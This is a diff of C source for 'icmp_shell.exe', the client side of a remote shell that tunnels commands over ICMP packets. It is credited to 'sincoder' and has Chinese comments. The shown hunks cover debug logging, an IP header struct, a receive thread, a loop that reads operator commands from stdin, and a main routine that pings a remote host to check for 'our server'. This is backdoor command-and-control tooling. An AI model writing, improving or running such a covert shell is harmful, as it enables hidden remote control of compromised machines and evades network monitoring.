@@ -53,7 +53,7 @@ icmp_shell.exe [ip]
 
 #define MAX_BUFF_SIZE 1000
 
-#if _MSC_VER <= 1200
+//#if _MSC_VER <= 1200
 void dbg_msg(char *fmt, ...)
 {
 #ifdef _DEBUG
@@ -66,11 +66,13 @@ void dbg_msg(char *fmt, ...)
     va_end(args);
 #endif
 }
+/*
 #else  //使用宏来定义 
 #define dbg_msg(fmt,...) do{\
         printf(##__FUNCTION__##" %d :"##fmt,__LINE__,__VA_ARGS__);\
-    }while(0);
+}while(0);
 #endif
+*/
 
 #ifndef _In_
 #define _In_
@@ -78,10 +80,10 @@ void dbg_msg(char *fmt, ...)
 #define _In_opt_
 #endif
 
-typedef unsigned char uint8;
-typedef unsigned short uint16;
-typedef unsigned int uint32;
-typedef CRITICAL_SECTION  lock;
+typedef unsigned char       uint8;
+typedef unsigned short      uint16;
+typedef unsigned int        uint32;
+typedef CRITICAL_SECTION    lock;
 
 __inline void lock_init(lock *cs)
 {
@@ -148,7 +150,7 @@ typedef struct ip_address
 
 typedef struct _IPHeader        // 20字节的IP头
 {
-    uint8     iphVerLen;      // 版本号和头长度（各占4位）
+    uint8     iphVerLen;     // 版本号和头长度（各占4位）
     uint8     ipTOS;          // 服务类型
     uint16    ipLength;       // 封包总长度，即整个IP报的长度
     uint16    ipID;           // 封包标识，惟一标识发送的每一个数据报
@@ -403,7 +405,7 @@ DWORD __stdcall Icmp_recv_thread(LPVOID lparam)
             }
         }
     }
-    dbg_msg("icmp recv thread end !! \n");
+    dbg_msg("icmp recv thread end !! %d \n",GetLastError());
     return 0;
 }
 
@@ -417,8 +419,10 @@ void Loop_recv_cmd()
     while (TRUE)
     {
         if (!fgets(line, sizeof(line) - 1 , stdin))
+        {
+            dbg_msg("??? \n");
             break; //控制台已经被关闭了
-
+        }
         // Remove the terminating new line character.
 
         inputLength = (ULONG)strlen(line);
@@ -433,11 +437,13 @@ void Loop_recv_cmd()
         //    continue;
         //}
         //send command
-        //printf("%s\n",command);
+        
         lock_lock(&g_input_lock);
         strcat(g_input_buffer, line);
         lock_unlock(&g_input_lock);
     }
+
+    dbg_msg("!!!!!!exit loop ..\n");
 }
 
 // from s port scanner
@@ -539,7 +545,7 @@ int main(int argc, char **argv)
     int len = sizeof(struct sockaddr);
     HANDLE hRecvThread;
 
-    if (argc < 3)
+    if (argc < 2)
     {
         printf("icmp shell \nBy sincoder \nUsage:%0 [ip] \n");
         return -1;
@@ -594,13 +600,16 @@ int main(int argc, char **argv)
     hRecvThread = CreateThread(NULL, 0, Icmp_recv_thread, NULL, 0, NULL);
     dbg_msg("send init command request !! \n");
     // 发送一个包 探测下 远程 是不是 正在运行着我们的 服务端
-    if (ping_remote_host(g_remote_ip))
+    if (ping_remote_host(g_remote_ip)) //ping 失败还是有可能激活原创的服务端的
     {
         dbg_msg("ping host %s OK !! \n", g_remote_ip);
         //对方可以 Ping 的 通
         Loop_recv_cmd();  //接收用户的输入
     }
-
+    else
+    {
+        printf("ping failed !! ");
+    }
     dbg_msg("last error : %d \n", GetLastError());
     closesocket(g_sock);
     WaitForSingleObject(hRecvThread, INFINITE);
